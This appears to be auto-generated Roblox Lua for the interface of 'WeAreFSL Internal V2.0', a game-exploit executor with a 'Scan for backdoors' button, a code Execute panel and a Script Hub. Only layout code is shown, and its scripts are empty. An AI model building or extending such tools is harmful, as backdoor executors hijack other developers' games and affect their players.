--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 158 | Scripts: 35 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.ScreenGui.Scanner
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["Visible"] = false;
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["2"]["Size"] = UDim2.new(0, 491, 0, 295);
G2L["2"]["Position"] = UDim2.new(0.33407, 0, 0.34254, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[Scanner]];


-- StarterGui.ScreenGui.Scanner.UICorner
G2L["3"] = Instance.new("UICorner", G2L["2"]);
G2L["3"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Scanner.UIStroke
G2L["4"] = Instance.new("UIStroke", G2L["2"]);
G2L["4"]["Thickness"] = 3;
G2L["4"]["Color"] = Color3.fromRGB(141, 141, 141);


-- StarterGui.ScreenGui.Scanner.Epixlaz
G2L["5"] = Instance.new("ImageLabel", G2L["2"]);
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["5"]["Image"] = [[rbxassetid://109509735989414]];
G2L["5"]["Size"] = UDim2.new(0, 50, 0, 50);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["BackgroundTransparency"] = 1;
G2L["5"]["Name"] = [[Epixlaz]];
G2L["5"]["Position"] = UDim2.new(0.03478, 0, 0.01388, 3);


-- StarterGui.ScreenGui.Scanner.Epixlaz.TextLabel
G2L["6"] = Instance.new("TextLabel", G2L["5"]);
G2L["6"]["TextWrapped"] = true;
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["TextSize"] = 16;
G2L["6"]["TextScaled"] = true;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Italic);
G2L["6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["BackgroundTransparency"] = 1;
G2L["6"]["RichText"] = true;
G2L["6"]["Size"] = UDim2.new(0, 311, 0, 43);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Text"] = [[WeAreFSL Scanner Internal V2.0]];
G2L["6"]["Position"] = UDim2.new(1.45789, 0, 0.1379, 0);


-- StarterGui.ScreenGui.Scanner.Scan
G2L["7"] = Instance.new("TextButton", G2L["2"]);
G2L["7"]["TextWrapped"] = true;
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["TextSize"] = 58;
G2L["7"]["TextColor3"] = Color3.fromRGB(236, 236, 236);
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Michroma.json]], Enum.FontWeight.Bold, Enum.FontStyle.Italic);
G2L["7"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["7"]["Size"] = UDim2.new(0.47904, 125, 0.5939, -10);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Text"] = [[Scan for backdoors]];
G2L["7"]["Name"] = [[Scan]];
G2L["7"]["Position"] = UDim2.new(0.8666, 0, 0.54543, 0);


-- StarterGui.ScreenGui.Scanner.Scan.UICorner
G2L["8"] = Instance.new("UICorner", G2L["7"]);



-- StarterGui.ScreenGui.Scanner.Scan.UIStroke
G2L["9"] = Instance.new("UIStroke", G2L["7"]);
G2L["9"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["9"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Scanner.Scan.LocalScript
G2L["a"] = Instance.new("LocalScript", G2L["7"]);



-- StarterGui.ScreenGui.Scanner.LocalScript
G2L["b"] = Instance.new("LocalScript", G2L["2"]);



-- StarterGui.ScreenGui.Exec
G2L["c"] = Instance.new("Frame", G2L["1"]);
G2L["c"]["Active"] = true;
G2L["c"]["BorderSizePixel"] = 0;
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["c"]["Selectable"] = true;
G2L["c"]["Size"] = UDim2.new(0, 574, 0, 350);
G2L["c"]["Position"] = UDim2.new(0.23887, 0, 0.19941, 0);
G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Name"] = [[Exec]];


-- StarterGui.ScreenGui.Exec.UIStroke
G2L["d"] = Instance.new("UIStroke", G2L["c"]);
G2L["d"]["Thickness"] = 3;
G2L["d"]["Color"] = Color3.fromRGB(141, 141, 141);


-- StarterGui.ScreenGui.Exec.UICorner
G2L["e"] = Instance.new("UICorner", G2L["c"]);
G2L["e"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Exec.Highlighter
G2L["f"] = Instance.new("LocalScript", G2L["c"]);
G2L["f"]["Enabled"] = false;
G2L["f"]["Name"] = [[Highlighter]];
G2L["f"]["Disabled"] = true;


-- StarterGui.ScreenGui.Exec.LocalScript
G2L["10"] = Instance.new("LocalScript", G2L["c"]);



-- StarterGui.ScreenGui.Exec.Execute
G2L["11"] = Instance.new("TextButton", G2L["c"]);
G2L["11"]["BorderSizePixel"] = 0;
G2L["11"]["TextSize"] = 15;
G2L["11"]["TextColor3"] = Color3.fromRGB(236, 236, 236);
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["11"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["11"]["Size"] = UDim2.new(-0.08763, 125, 0.37173, -10);
G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["Text"] = [[Execute]];
G2L["11"]["Name"] = [[Execute]];
G2L["11"]["Position"] = UDim2.new(0.98447, 0, 0.31259, 0);


-- StarterGui.ScreenGui.Exec.Execute.UICorner
G2L["12"] = Instance.new("UICorner", G2L["11"]);



-- StarterGui.ScreenGui.Exec.Execute.UIStroke
G2L["13"] = Instance.new("UIStroke", G2L["11"]);
G2L["13"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["13"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Execute.LocalScript
G2L["14"] = Instance.new("LocalScript", G2L["11"]);



-- StarterGui.ScreenGui.Exec.Clear
G2L["15"] = Instance.new("TextButton", G2L["c"]);
G2L["15"]["BorderSizePixel"] = 0;
G2L["15"]["TextSize"] = 15;
G2L["15"]["TextColor3"] = Color3.fromRGB(236, 236, 236);
G2L["15"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["15"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["15"]["Size"] = UDim2.new(-0.08763, 125, 0.37173, -10);
G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["Text"] = [[Clear]];
G2L["15"]["Name"] = [[Clear]];
G2L["15"]["Position"] = UDim2.new(0.98447, 0, 0.68101, 0);


-- StarterGui.ScreenGui.Exec.Clear.UICorner
G2L["16"] = Instance.new("UICorner", G2L["15"]);



-- StarterGui.ScreenGui.Exec.Clear.UIStroke
G2L["17"] = Instance.new("UIStroke", G2L["15"]);
G2L["17"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["17"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Clear.LocalScript
G2L["18"] = Instance.new("LocalScript", G2L["15"]);



-- StarterGui.ScreenGui.Exec.R6
G2L["19"] = Instance.new("TextButton", G2L["c"]);
G2L["19"]["BorderSizePixel"] = 0;
G2L["19"]["TextSize"] = 15;
G2L["19"]["TextColor3"] = Color3.fromRGB(236, 236, 236);
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["19"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["19"]["Size"] = UDim2.new(-0.07184, 125, 0.11476, -10);
G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["Text"] = [[R6]];
G2L["19"]["Name"] = [[R6]];
G2L["19"]["Position"] = UDim2.new(0.65963, 0, 0.93643, 0);


-- StarterGui.ScreenGui.Exec.R6.UICorner
G2L["1a"] = Instance.new("UICorner", G2L["19"]);



-- StarterGui.ScreenGui.Exec.R6.UIStroke
G2L["1b"] = Instance.new("UIStroke", G2L["19"]);
G2L["1b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["1b"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.R6.LocalScript
G2L["1c"] = Instance.new("LocalScript", G2L["19"]);



-- StarterGui.ScreenGui.Exec.Reset
G2L["1d"] = Instance.new("TextButton", G2L["c"]);
G2L["1d"]["BorderSizePixel"] = 0;
G2L["1d"]["TextSize"] = 15;
G2L["1d"]["TextColor3"] = Color3.fromRGB(236, 236, 236);
G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["1d"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["1d"]["Size"] = UDim2.new(-0.07184, 125, 0.11476, -10);
G2L["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d"]["Text"] = [[Reset]];
G2L["1d"]["Name"] = [[Reset]];
G2L["1d"]["Position"] = UDim2.new(0.82399, 0, 0.93643, 0);


-- StarterGui.ScreenGui.Exec.Reset.UICorner
G2L["1e"] = Instance.new("UICorner", G2L["1d"]);



-- StarterGui.ScreenGui.Exec.Reset.UIStroke
G2L["1f"] = Instance.new("UIStroke", G2L["1d"]);
G2L["1f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["1f"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Reset.LocalScript
G2L["20"] = Instance.new("LocalScript", G2L["1d"]);



-- StarterGui.ScreenGui.Exec.Scan
G2L["21"] = Instance.new("TextButton", G2L["c"]);
G2L["21"]["TextWrapped"] = true;
G2L["21"]["BorderSizePixel"] = 0;
G2L["21"]["TextSize"] = 15;
G2L["21"]["TextScaled"] = true;
G2L["21"]["TextColor3"] = Color3.fromRGB(236, 236, 236);
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["21"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["21"]["Size"] = UDim2.new(-0.07184, 125, 0.11476, -10);
G2L["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["Text"] = [[Scanner Backup]];
G2L["21"]["Name"] = [[Scan]];
G2L["21"]["Position"] = UDim2.new(0.98447, 0, 0.93643, 0);


-- StarterGui.ScreenGui.Exec.Scan.UICorner
G2L["22"] = Instance.new("UICorner", G2L["21"]);



-- StarterGui.ScreenGui.Exec.Scan.UIStroke
G2L["23"] = Instance.new("UIStroke", G2L["21"]);
G2L["23"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["23"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scan.LocalScript
G2L["24"] = Instance.new("LocalScript", G2L["21"]);



-- StarterGui.ScreenGui.Exec.Epixlaz
G2L["25"] = Instance.new("ImageLabel", G2L["c"]);
G2L["25"]["BorderSizePixel"] = 0;
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["25"]["Image"] = [[rbxassetid://109509735989414]];
G2L["25"]["Size"] = UDim2.new(0, 40, 0, 39);
G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["BackgroundTransparency"] = 1;
G2L["25"]["Name"] = [[Epixlaz]];
G2L["25"]["Position"] = UDim2.new(0.021, 0, 0, 3);


-- StarterGui.ScreenGui.Exec.Epixlaz.TextLabel
G2L["26"] = Instance.new("TextLabel", G2L["25"]);
G2L["26"]["TextWrapped"] = true;
G2L["26"]["BorderSizePixel"] = 0;
G2L["26"]["TextSize"] = 14;
G2L["26"]["TextScaled"] = true;
G2L["26"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Italic);
G2L["26"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26"]["BackgroundTransparency"] = 1;
G2L["26"]["RichText"] = true;
G2L["26"]["Size"] = UDim2.new(0, 243, 0, 37);
G2L["26"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26"]["Text"] = [[WeAreFSL Internal V2.0]];
G2L["26"]["Position"] = UDim2.new(4.20526, 0, 0.02632, 0);


-- StarterGui.ScreenGui.Exec.Scripthub
G2L["27"] = Instance.new("Frame", G2L["c"]);
G2L["27"]["Visible"] = false;
G2L["27"]["BorderSizePixel"] = 0;
G2L["27"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["27"]["Size"] = UDim2.new(0, 276, 0, 323);
G2L["27"]["Position"] = UDim2.new(1.03873, 0, -0.00104, 0);
G2L["27"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27"]["Name"] = [[Scripthub]];


-- StarterGui.ScreenGui.Exec.Scripthub.UIStroke
G2L["28"] = Instance.new("UIStroke", G2L["27"]);
G2L["28"]["Thickness"] = 3;
G2L["28"]["Color"] = Color3.fromRGB(141, 141, 141);


-- StarterGui.ScreenGui.Exec.Scripthub.UICorner
G2L["29"] = Instance.new("UICorner", G2L["27"]);
G2L["29"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Exec.Scripthub.TextLabel
G2L["2a"] = Instance.new("TextLabel", G2L["27"]);
G2L["2a"]["TextWrapped"] = true;
G2L["2a"]["BorderSizePixel"] = 0;
G2L["2a"]["TextSize"] = 14;
G2L["2a"]["TextScaled"] = true;
G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Italic);
G2L["2a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a"]["BackgroundTransparency"] = 1;
G2L["2a"]["Size"] = UDim2.new(0, 234, 0, 30);
G2L["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a"]["Text"] = [[Script Hub]];
G2L["2a"]["Position"] = UDim2.new(0.07609, 0, 0.03406, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame
G2L["2b"] = Instance.new("ScrollingFrame", G2L["27"]);
G2L["2b"]["Active"] = true;
G2L["2b"]["BorderSizePixel"] = 0;
G2L["2b"]["CanvasSize"] = UDim2.new(0, 0, 3, 0);
G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b"]["Size"] = UDim2.new(0, 276, 0, 272);
G2L["2b"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["Position"] = UDim2.new(0, 0, 0.15789, 0);
G2L["2b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.Polaria
G2L["2c"] = Instance.new("TextButton", G2L["2b"]);
G2L["2c"]["TextWrapped"] = true;
G2L["2c"]["BorderSizePixel"] = 0;
G2L["2c"]["TextSize"] = 14;
G2L["2c"]["TextScaled"] = true;
G2L["2c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["2c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2c"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["Text"] = [[ Polaria]];
G2L["2c"]["Name"] = [[Polaria]];
G2L["2c"]["Position"] = UDim2.new(0.07609, 0, 0.00735, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.Polaria.UICorner
G2L["2d"] = Instance.new("UICorner", G2L["2c"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.Polaria.UIStroke
G2L["2e"] = Instance.new("UIStroke", G2L["2c"]);
G2L["2e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2e"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.Polaria.LocalScript
G2L["2f"] = Instance.new("LocalScript", G2L["2c"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.Polaria.Script
G2L["30"] = Instance.new("Script", G2L["2c"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.Polaria.RemoteEvent
G2L["31"] = Instance.new("RemoteEvent", G2L["2c"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["32"] = Instance.new("TextButton", G2L["2b"]);
G2L["32"]["TextWrapped"] = true;
G2L["32"]["BorderSizePixel"] = 0;
G2L["32"]["TextSize"] = 14;
G2L["32"]["TextScaled"] = true;
G2L["32"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["32"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["32"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["32"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["32"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32"]["Position"] = UDim2.new(0.076, 0, 0.048, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["33"] = Instance.new("UICorner", G2L["32"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["34"] = Instance.new("UIStroke", G2L["32"]);
G2L["34"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["34"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["35"] = Instance.new("LocalScript", G2L["32"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["36"] = Instance.new("TextButton", G2L["2b"]);
G2L["36"]["TextWrapped"] = true;
G2L["36"]["BorderSizePixel"] = 0;
G2L["36"]["TextSize"] = 14;
G2L["36"]["TextScaled"] = true;
G2L["36"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["36"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["36"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["36"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["36"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["36"]["Position"] = UDim2.new(0.076, 0, 0.087, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["37"] = Instance.new("UICorner", G2L["36"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["38"] = Instance.new("UIStroke", G2L["36"]);
G2L["38"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["38"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["39"] = Instance.new("LocalScript", G2L["36"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["3a"] = Instance.new("TextButton", G2L["2b"]);
G2L["3a"]["TextWrapped"] = true;
G2L["3a"]["BorderSizePixel"] = 0;
G2L["3a"]["TextSize"] = 14;
G2L["3a"]["TextScaled"] = true;
G2L["3a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["3a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3a"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a"]["Position"] = UDim2.new(0.076, 0, 0.126, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["3b"] = Instance.new("UICorner", G2L["3a"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["3c"] = Instance.new("UIStroke", G2L["3a"]);
G2L["3c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["3c"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["3d"] = Instance.new("LocalScript", G2L["3a"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["3e"] = Instance.new("TextButton", G2L["2b"]);
G2L["3e"]["TextWrapped"] = true;
G2L["3e"]["BorderSizePixel"] = 0;
G2L["3e"]["TextSize"] = 14;
G2L["3e"]["TextScaled"] = true;
G2L["3e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["3e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3e"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e"]["Position"] = UDim2.new(0.076, 0, 0.165, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["3f"] = Instance.new("UICorner", G2L["3e"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["40"] = Instance.new("UIStroke", G2L["3e"]);
G2L["40"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["40"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["41"] = Instance.new("LocalScript", G2L["3e"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["42"] = Instance.new("TextButton", G2L["2b"]);
G2L["42"]["TextWrapped"] = true;
G2L["42"]["BorderSizePixel"] = 0;
G2L["42"]["TextSize"] = 14;
G2L["42"]["TextScaled"] = true;
G2L["42"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["42"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["42"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["42"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["42"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["42"]["Position"] = UDim2.new(0.076, 0, 0.205, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["43"] = Instance.new("UICorner", G2L["42"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["44"] = Instance.new("UIStroke", G2L["42"]);
G2L["44"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["44"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["45"] = Instance.new("LocalScript", G2L["42"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["46"] = Instance.new("TextButton", G2L["2b"]);
G2L["46"]["TextWrapped"] = true;
G2L["46"]["BorderSizePixel"] = 0;
G2L["46"]["TextSize"] = 14;
G2L["46"]["TextScaled"] = true;
G2L["46"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["46"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["46"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["46"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["46"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["46"]["Position"] = UDim2.new(0.076, 0, 0.245, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["47"] = Instance.new("UICorner", G2L["46"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["48"] = Instance.new("UIStroke", G2L["46"]);
G2L["48"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["48"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["49"] = Instance.new("LocalScript", G2L["46"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["4a"] = Instance.new("TextButton", G2L["2b"]);
G2L["4a"]["TextWrapped"] = true;
G2L["4a"]["BorderSizePixel"] = 0;
G2L["4a"]["TextSize"] = 14;
G2L["4a"]["TextScaled"] = true;
G2L["4a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["4a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4a"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["4a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4a"]["Position"] = UDim2.new(0.076, 0, 0.285, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["4b"] = Instance.new("UICorner", G2L["4a"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["4c"] = Instance.new("UIStroke", G2L["4a"]);
G2L["4c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["4c"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
G2L["4d"] = Instance.new("LocalScript", G2L["4a"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton
G2L["4e"] = Instance.new("TextButton", G2L["2b"]);
G2L["4e"]["TextWrapped"] = true;
G2L["4e"]["BorderSizePixel"] = 0;
G2L["4e"]["TextSize"] = 14;
G2L["4e"]["TextScaled"] = true;
G2L["4e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4e"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["4e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4e"]["Size"] = UDim2.new(0, 234, 0, 27);
G2L["4e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4e"]["Position"] = UDim2.new(0.076, 0, 0.325, 0);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UICorner
G2L["4f"] = Instance.new("UICorner", G2L["4e"]);



-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.UIStroke
G2L["50"] = Instance.new("UIStroke", G2L["4e"]);
G2L["50"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["50"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
